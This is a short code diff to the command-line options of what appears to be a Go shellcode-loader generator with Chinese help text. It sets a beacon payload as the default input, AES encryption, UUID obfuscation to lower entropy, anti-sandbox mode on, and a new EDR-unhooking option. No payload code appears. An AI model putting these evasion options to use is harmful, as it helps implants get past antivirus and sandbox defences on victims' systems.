@@ -12,18 +12,19 @@ import (
 
 func Options() *Others.FlagOptions {
 	help := flag.Bool("h", false, "使用帮助")
-	inputFile := flag.String("i", "calc_shellcode_64.bin", "原始格式 Shellcode 的路径")
-	encryption := flag.String("enc", "xor", "Shellcode加密方式 (例如, aes, xor)")
+	inputFile := flag.String("i", "beacon_x64.bin", "原始格式 Shellcode 的路径")
+	encryption := flag.String("enc", "aes", "Shellcode加密方式 (例如, aes, xor)")
 	language := flag.String("lang", "c", "加载器的语言")
-	outFile := flag.String("o", "Program", "输出文件")
+	outFile := flag.String("o", "bea", "输出文件")
 	keyLength := flag.Int("k", 16, "加密的密钥长度")
-	obfuscation := flag.String("obf", "words", "混淆 Shellcode 以降低熵值 (i.e.,uuid,words)")
+	obfuscation := flag.String("obf", "uuid", "混淆 Shellcode 以降低熵值 (i.e.,uuid,words)")
 	framework := flag.Int("f", 64, "选择32位还是64位")
-	sandbox := flag.Bool("sandbox", false, "是否开启反沙箱模式")
+	sandbox := flag.Bool("sandbox", true, "是否开启反沙箱模式")
+	unhook := flag.Bool("unhook", false, "是否使用unhook模式(默认使用syscall)")
 	loadingTechnique := flag.String("loading", "fiber", "请选择加载方式，支持callback,fiber,earlybird")
 	flag.Parse()
 
-	return &Others.FlagOptions{Help: *help, OutFile: *outFile, InputFile: *inputFile, Language: *language, Encryption: *encryption, KeyLength: *keyLength, Obfuscation: *obfuscation, Framework: *framework, Sandbox: *sandbox, Loading: *loadingTechnique}
+	return &Others.FlagOptions{Help: *help, OutFile: *outFile, InputFile: *inputFile, Language: *language, Encryption: *encryption, KeyLength: *keyLength, Obfuscation: *obfuscation, Framework: *framework, Sandbox: *sandbox, Unhook: *unhook, Loading: *loadingTechnique}
 }
 
 func main() {
